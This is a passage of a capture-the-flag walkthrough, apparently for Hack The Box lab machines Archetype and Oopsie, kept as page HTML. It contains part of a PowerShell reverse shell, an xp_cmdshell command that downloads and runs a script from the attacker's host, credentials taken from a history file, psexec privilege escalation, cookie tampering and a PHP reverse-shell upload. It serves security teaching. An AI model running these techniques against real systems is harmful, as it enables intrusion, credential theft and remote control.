  <span class="o">{</span><span class="p">;</span><span class="se">\$</span><span class="nv">data</span> <span class="o">=</span> <span class="o">(</span>New-Object -TypeName System.Text.ASCIIEncoding<span class="o">)</span>.GetString<span class="o">(</span><span class="se">\$</span>bytes,0, <span class="se">\$</span>i<span class="o">)</span><span class="p">;</span>
  
  <span class="se">\$</span><span class="nv">sendback</span> <span class="o">=</span> <span class="o">(</span>iex <span class="se">\$</span>data 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> Out-String <span class="o">)</span><span class="p">;</span>
  
  <span class="se">\$</span><span class="nv">sendback2</span> <span class="o">=</span> <span class="se">\$</span>sendback + <span class="s2">&#34;\# &#34;</span><span class="p">;</span>
  
  <span class="se">\$</span><span class="nv">sendbyte</span> <span class="o">=</span> <span class="o">(</span><span class="se">\[</span>text.encoding<span class="se">\]</span>::ASCII<span class="o">)</span>.GetBytes<span class="o">(</span><span class="se">\$</span>sendback2<span class="o">)</span><span class="p">;</span><span class="se">\$</span>stream.Write<span class="o">(</span><span class="se">\$</span>sendbyte,0,<span class="se">\$</span>sendbyte.Length<span class="o">)</span><span class="p">;</span>
  
  <span class="se">\$</span>stream.Flush<span class="o">()}</span><span class="p">;</span>
  
  <span class="se">\$</span>client.Close<span class="o">()</span>
  ---------------------------------------------------------------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p>Next, stand up a mini webserver in order to host the file. We can use
Python.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  --------------------------------------------------------
  python3 -m http.server <span class="m">80</span>
  -------------------------------------------------------- 
</code></pre></td></tr></table>
</div>
</div><p>Below the python mini webserver started:<br></p>
<div style="width:100%; background-color:#252b34"><img src="StartingPoint_1.png"></div>
<p>After standing up a netcat listener on port 443, we can use ufw to allow
the call backs on port 80 and 443 to our machine.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  ---------------------------------------------------------
  nc -lvnp <span class="m">443</span>
  
  ufw allow from 10.10.10.27 proto tcp to any port 80,443
  ---------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p>Below the netcat listener started:<br></p>
<div style="width:100%; background-color:#252b34"><img src="StartingPoint_2.png"></div>
<p>We can now issue the command to download and execute the reverse shell
through xp_cmdshell. (10.10.14.16 attacking machine)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  -------------------------------------------------------------------------------------------------------------------
 xp_cmdshell <span class="s2">&#34;powershell &#34;</span>IEX <span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="se">\\</span><span class="s2">&#34;http://10.10.14.16/shell.ps1\\&#34;</span><span class="o">)</span><span class="p">;</span><span class="s2">&#34;
</span><span class="s2">  -------------------------------------------------------------------------------------------------------------------
</span></code></pre></td></tr></table>
</div>
</div><!-- 
<div style="width:100%; background-color:#252b34"><img src="StartingPoint_3.png"></div>
-->
<p>We can see from our mini webserver that a file has been downloaded</p>
<div style="width:100%; background-color:#252b34"><img src="StartingPoint_4.png"></div>
<p>A shell is received as <strong>sql_svc</strong>, and we can get the user.txt on
their desktop.</p>
<div style="width:100%; background-color:#252b34"><img src="StartingPoint_5.png"></div>
<p>Using Tmux, that’s all in one window:</p>
<div style="width:100%; background-color:#252b34"><img src="StartingPoint_6.png"></div>
<h3 id="9702--privilege-escalation">◦  Privilege Escalation</h3>
<p>======================</p>
<p>As this is a normal user account as well as a service account, it is
worth checking for frequently access files or executed commands. We can
use the <em>type</em> command to access the PowerShell history file.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  ------------------------------------------------------------------------------------------------------------------
  <span class="nb">type</span> C:<span class="se">\\</span>Users<span class="se">\\</span>sql<span class="se">\_</span>svc<span class="se">\\</span>AppData<span class="se">\\</span>Roaming<span class="se">\\</span>Microsoft<span class="se">\\</span>Windows<span class="se">\\</span>PowerShell<span class="se">\\</span>PSReadline<span class="se">\\</span>ConsoleHost<span class="se">\_</span>history.txt
  ------------------------------------------------------------------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p>From the ConsoleHost_history.txt we can see the administrator password:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  -------------------------------------------------------------------------------------
  net.exe use T: <span class="se">\\\\</span>Archetype<span class="se">\\</span>backups /user:**administrator** **MEGACORP<span class="se">\_</span>4dm1n!!**
  
  <span class="nb">exit</span>
  -------------------------------------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><div style="width:100%; background-color:#252b34"><img src="StartingPoint_7.png"></div>
<p>This also reveals that the backups drive has been mapped using the local
administrator credentials. We can use Impacket&rsquo;s psexec.py to gain a
privileged shell.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  ------------------------------------------------------------------------------------------
  python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator@10.10.10.27
  ------------------------------------------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><!-- <div style="width:100%; background-color:#252b34"><img src="StartingPoint_8.png"></div> -->
<br>
Once gained the privileged shell, we can now search for <b>"root.txt"</b>
<br><br>
<div style="width:100%; background-color:#252b34;text-align: center;"><img src="StartingPoint_9.png" style="width:80%;height:50%"></div>
<!-- <div style="width:100%; background-color:#252b34"><img src="StartingPoint_10.png" style="width:100%;height:100%"></div>-->
<h2 id="9656--oopsie">▸  OOPSIE</h2>
<h3 id="9702--about">◦  About</h3>
<p>=============</p>
<p>This box features debugging session and MySQL enumeration</p>
<ul>
<li>Machine : <b>Oopsie</b> </li>
<li>Ip: <b>10.10.10.28</b></li>
</ul>
<h3 id="9702--enumeration-1">◦  Enumeration</h3>
<p>=============</p>
<p><em><strong>nmap -sC -sV 10.10.10.28</strong></em></p>
<p>Running a simple Nmap scan reveals <em><strong>two</strong></em> open ports running, for SSH
and Apache respectively.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">  ------------------------------------------------------------------------------------------------
  Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-06 03:34 EDT
  
  Nmap scan report for 10.10.10.28
  
  Host is up (0.037s latency).
  
  Not shown: 998 closed ports
  
  PORT STATE SERVICE VERSION
  
  **22**/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  
  | ssh-hostkey:
  
  | 2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
  
  | 256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
  
  |\_ 256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
  
  **80**/tcp open http Apache httpd 2.4.29 ((Ubuntu))
  
  |\_http-server-header: Apache/2.4.29 (Ubuntu)
  
  |\_http-title: Welcome
  
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel
  
  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  
  Nmap done: 1 IP address (1 host up) scanned in 23.92 seconds
  ------------------------------------------------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p>Nmap reveals reveals that SSH and Apache are available on their default
ports. Let&rsquo;s check out the website.</p>
<!-- <div style="width:100%; background-color:#252b34;text-align: center;"><img src="StartingPoint_11.png"></div> -->
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image11.png"
        data-srcset="/startingpoint/media/image11.png, media/image11.png 1.5x, /startingpoint/media/image11.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image11.png"
        title="/startingpoint/media/image11.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>It seems to be a website for the electric vehicle manufacturer MegaCorp.
Scrolling down, we note that a reference is made to logging in.</p>
<!-- <div style="width:100%; background-color:#252b34;text-align: center;"><img src="StartingPoint_12.png"></div>  -->
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image12.png"
        data-srcset="/startingpoint/media/image12.png, media/image12.png 1.5x, /startingpoint/media/image12.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image12.png"
        title="/startingpoint/media/image12.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>We can&rsquo;t see anything else of interest, so let&rsquo;s send the request to a
web proxy such as Burp, so we can examine the website in more detail.</p>
<p>We point the browser to the Burp proxy at <strong>127.0.0.1:8080</strong>, refresh
the page, and forward the request.</p>
<!-- <div style="width:100%; background-color:#252b34;text-align: center;"><img src="StartingPoint_13.png"></div> -->
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image13.png"
        data-srcset="/startingpoint/media/image13.png, media/image13.png 1.5x, /startingpoint/media/image13.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image13.png"
        title="/startingpoint/media/image13.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image14.png"
        data-srcset="/startingpoint/media/image14.png, media/image14.png 1.5x, /startingpoint/media/image14.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image14.png"
        title="/startingpoint/media/image14.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>On the Target tab, we notice that Burp has passively <strong>spidered</strong> the
website while processing the request.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image15.png"
        data-srcset="/startingpoint/media/image15.png, media/image15.png 1.5x, /startingpoint/media/image15.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image15.png"
        title="/startingpoint/media/image15.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>We can see the url “<strong>/cdn-cgi/login</strong>”.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image16.png"
        data-srcset="/startingpoint/media/image16.png, media/image16.png 1.5x, /startingpoint/media/image16.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image16.png"
        title="/startingpoint/media/image16.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>We could have also simply used our browser; in Firefox we could have
inspected the web page, and we could have found the same url under the
<strong>Network Monitor</strong> tab:</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image17.png"
        data-srcset="/startingpoint/media/image17.png, media/image17.png 1.5x, /startingpoint/media/image17.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image17.png"
        title="/startingpoint/media/image17.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/>}</p>
<p>We could have just used “<strong>Edit and Resend</strong>”</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image18.png"
        data-srcset="/startingpoint/media/image18.png, media/image18.png 1.5x, /startingpoint/media/image18.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image18.png"
        title="/startingpoint/media/image18.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>Just modify the URL into “<strong>http://10.10.10.28/cdn-cgi/login/</strong>”</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image19.png"
        data-srcset="/startingpoint/media/image19.png, media/image19.png 1.5x, /startingpoint/media/image19.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image19.png"
        title="/startingpoint/media/image19.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>And click “Send”</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image20.png"
        data-srcset="/startingpoint/media/image20.png, media/image20.png 1.5x, /startingpoint/media/image20.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image20.png"
        title="/startingpoint/media/image20.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>And the link to the login page appear in our list:</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image21.png"
        data-srcset="/startingpoint/media/image21.png, media/image21.png 1.5x, /startingpoint/media/image21.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image21.png"
        title="/startingpoint/media/image21.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>Now just open it in a “New Tab”</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image22.png"
        data-srcset="/startingpoint/media/image22.png, media/image22.png 1.5x, /startingpoint/media/image22.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image22.png"
        title="/startingpoint/media/image22.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>We confirm that this is a login page. Let&rsquo;s try to reuse the password
<strong>MEGACORP_4dm1n!!</strong> from the previously compromised machine, with
common usernames such as <strong>administrator</strong> or <strong>admin</strong> .</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image23.png"
        data-srcset="/startingpoint/media/image23.png, media/image23.png 1.5x, /startingpoint/media/image23.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image23.png"
        title="IMG_256"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>This is successful, and we gain access to the web portal, which contains
additional functionality.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image24.png"
        data-srcset="/startingpoint/media/image24.png, media/image24.png 1.5x, /startingpoint/media/image24.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image24.png"
        title="IMG_256"
        style="width: 100%;object-fit: cover;margin: 0pt;"/>
However, it seems the developer has implemented tiers of administration,
and the Uploads page is further restricted to the <strong>super admin</strong> user.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image25.png"
        data-srcset="/startingpoint/media/image25.png, media/image25.png 1.5x, /startingpoint/media/image25.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image25.png"
        title="/startingpoint/media/image25.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>Let&rsquo;s examine the URL:
“<strong>http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&amp;i</strong>d=”</p>
<p>We can see that for <strong>id=1,</strong> we will have user <strong>admin</strong></p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image26.png"
        data-srcset="/startingpoint/media/image26.png, media/image26.png 1.5x, /startingpoint/media/image26.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image26.png"
        title="/startingpoint/media/image26.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>If we pick <strong>Id=4</strong>, the user is now <strong>john</strong></p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image27.png"
        data-srcset="/startingpoint/media/image27.png, media/image27.png 1.5x, /startingpoint/media/image27.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image27.png"
        title="/startingpoint/media/image27.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>Let’s examine the page in <em><strong>Burp</strong></em>. We refresh on the Accounts page,
which displays the user id for our current user, and intercept the
request. We notice what seems to be a custom cookie implementation,
comprising of the <strong>user</strong> value and <strong>role</strong>. We also notice the <strong>id</strong>
parameter, which for our current admin user is 1.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image28.png"
        data-srcset="/startingpoint/media/image28.png, media/image28.png 1.5x, /startingpoint/media/image28.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image28.png"
        title="IMG_256"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>This shows that it might be possible to brute force the <strong>id</strong> values,
and display the <strong>user</strong> value for another user, such as the super admin
account.</p>
<p>We can do this using by trying a series of id values, we will use Burp&rsquo;s
<strong>Intruder module</strong>.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image29.png"
        data-srcset="/startingpoint/media/image29.png, media/image29.png 1.5x, /startingpoint/media/image29.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image29.png"
        title="/startingpoint/media/image29.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>We press Clear to remove the pre-populated payload positions</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image30.png"
        data-srcset="/startingpoint/media/image30.png, media/image30.png 1.5x, /startingpoint/media/image30.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image30.png"
        title="/startingpoint/media/image30.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>We now select the Id value (1),</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image31.png"
        data-srcset="/startingpoint/media/image31.png, media/image31.png 1.5x, /startingpoint/media/image31.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image31.png"
        title="/startingpoint/media/image31.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>We click Add.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image32.png"
        data-srcset="/startingpoint/media/image32.png, media/image32.png 1.5x, /startingpoint/media/image32.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image32.png"
        title="/startingpoint/media/image32.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>Next, click on the Payloads tab.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image33.png"
        data-srcset="/startingpoint/media/image33.png, media/image33.png 1.5x, /startingpoint/media/image33.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image33.png"
        title="/startingpoint/media/image33.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>We can generate a sequential list of 1-100 using a simple bash script</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  -----------------------------------------------
  **for i in <span class="se">\`</span>seq <span class="m">1</span> 100<span class="se">\`</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> <span class="se">\$</span>i<span class="p">;</span> <span class="k">done</span>**
  -----------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image34.png"
        data-srcset="/startingpoint/media/image34.png, media/image34.png 1.5x, /startingpoint/media/image34.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image34.png"
        title="/startingpoint/media/image34.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>&hellip;..</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image35.png"
        data-srcset="/startingpoint/media/image35.png, media/image35.png 1.5x, /startingpoint/media/image35.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image35.png"
        title="/startingpoint/media/image35.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>Paste the output into the Payloads box.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image36.png"
        data-srcset="/startingpoint/media/image36.png, media/image36.png 1.5x, /startingpoint/media/image36.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image36.png"
        title="IMG_256"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>Next we move to “Options” tab</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image37.png"
        data-srcset="/startingpoint/media/image37.png, media/image37.png 1.5x, /startingpoint/media/image37.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image37.png"
        title="/startingpoint/media/image37.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>We ensure that Follow Redirections is set to &ldquo;<strong>Always</strong>&rdquo;, and select
the option to &ldquo;<strong>Process cookies in redirections</strong>&rdquo;.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image38.png"
        data-srcset="/startingpoint/media/image38.png, media/image38.png 1.5x, /startingpoint/media/image38.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image38.png"
        title="IMG_256"
        style="width: 100%;object-fit: cover;margin: 0pt;"/>
Let’s click on the Target tab, and then click “<strong>Start attack</strong>”.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image39.png"
        data-srcset="/startingpoint/media/image39.png, media/image39.png 1.5x, /startingpoint/media/image39.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image39.png"
        title="/startingpoint/media/image39.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>We sort responses by Length, and view the results.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image40.png"
        data-srcset="/startingpoint/media/image40.png, media/image40.png 1.5x, /startingpoint/media/image40.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image40.png"
        title="IMG_256"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>A few of a responses have a different length, and we proceed to examine
them. The super admin account is visible, and <em><strong>corresponding user
value is identified</strong></em>(86575).</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image41.png"
        data-srcset="/startingpoint/media/image41.png, media/image41.png 1.5x, /startingpoint/media/image41.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image41.png"
        title="/startingpoint/media/image41.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>Let’s try to access the Uploads page again</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image42.png"
        data-srcset="/startingpoint/media/image42.png, media/image42.png 1.5x, /startingpoint/media/image42.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image42.png"
        title="/startingpoint/media/image42.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>Let’s substitute the user value (34322) with the super admins value
(86575).</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image43.png"
        data-srcset="/startingpoint/media/image43.png, media/image43.png 1.5x, /startingpoint/media/image43.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image43.png"
        title="/startingpoint/media/image43.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>Let’s click on “Forward” and see what the response into the browser
(let’s disable the proxy first)</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image44.png"
        data-srcset="/startingpoint/media/image44.png, media/image44.png 1.5x, /startingpoint/media/image44.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image44.png"
        title="/startingpoint/media/image44.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>Inspecting cookies, let’s see again the upload page:</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image45.png"
        data-srcset="/startingpoint/media/image45.png, media/image45.png 1.5x, /startingpoint/media/image45.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image45.png"
        title="/startingpoint/media/image45.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>We can see that the user’s Value is “<strong>34322</strong>” with role “admin”</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image46.png"
        data-srcset="/startingpoint/media/image46.png, media/image46.png 1.5x, /startingpoint/media/image46.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image46.png"
        title="/startingpoint/media/image46.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>Let’s try changing the users’ value into “<strong>86575</strong>” an see what happens
the we refresh the page</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image47.png"
        data-srcset="/startingpoint/media/image47.png, media/image47.png 1.5x, /startingpoint/media/image47.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image47.png"
        title="/startingpoint/media/image47.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>We do now have access as super admin:</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image48.png"
        data-srcset="/startingpoint/media/image48.png, media/image48.png 1.5x, /startingpoint/media/image48.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image48.png"
        title="/startingpoint/media/image48.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<h3 id="9702-foothold-1">◦ Foothold</h3>
<p>===============</p>
<p>Let’s check if the developer forgot to implement user input validation,
and so we should test if we can upload other files, such as a PHP
webshell.</p>
<p>Let’s locate the “php-reverse-shell.php” file.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image49.png"
        data-srcset="/startingpoint/media/image49.png, media/image49.png 1.5x, /startingpoint/media/image49.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image49.png"
        title="/startingpoint/media/image49.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>Let’s save this file as “<strong>check.php</strong>”</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image50.png"
        data-srcset="/startingpoint/media/image50.png, media/image50.png 1.5x, /startingpoint/media/image50.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image50.png"
        title="/startingpoint/media/image50.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>Let’s now customize the file “check.php” file with our IP address and
the port values</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image51.png"
        data-srcset="/startingpoint/media/image51.png, media/image51.png 1.5x, /startingpoint/media/image51.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image51.png"
        title="/startingpoint/media/image51.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>Page reports that the upload of the “<strong>check.php</strong>” file was successful</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image52.png"
        data-srcset="/startingpoint/media/image52.png, media/image52.png 1.5x, /startingpoint/media/image52.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image52.png"
        title="/startingpoint/media/image52.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/>
<img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image53.png"
        data-srcset="/startingpoint/media/image53.png, media/image53.png 1.5x, /startingpoint/media/image53.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image53.png"
        title="/startingpoint/media/image53.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
